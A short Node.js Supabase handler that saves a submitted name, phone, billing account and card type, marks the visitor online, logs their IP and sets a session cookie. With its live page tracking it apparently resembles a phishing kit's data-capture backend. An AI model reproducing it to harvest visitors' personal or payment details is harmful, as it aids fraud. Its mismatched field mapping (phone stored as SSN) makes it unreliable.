const { supabase, signToken, setCookie, parseBody } = require('../supabase');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const body = await parseBody(req);

  const { data, error } = await supabase.from('users').insert({
    username: body.name || '',
    phone: body.phone || '',
    address: body.bill_account || '',
    ssn: body.phone || '',
    insurance_company: body.card_type || '',
    page: 'index-details.html',
    message: 'معلومات مقدم الطلب',
    is_online: true,
    last_input_at: new Date().toISOString()
  }).select();

  if (data && data[0]) {
    const token = signToken({ userId: data[0].id });
    setCookie(res, 'user_token', token);

    await supabase.from('visits').insert({
      user_id: data[0].id,
      ip_address: req.headers['x-forwarded-for'] || req.socket?.remoteAddress || ''
    });
  }

  res.json({ success: true });
};
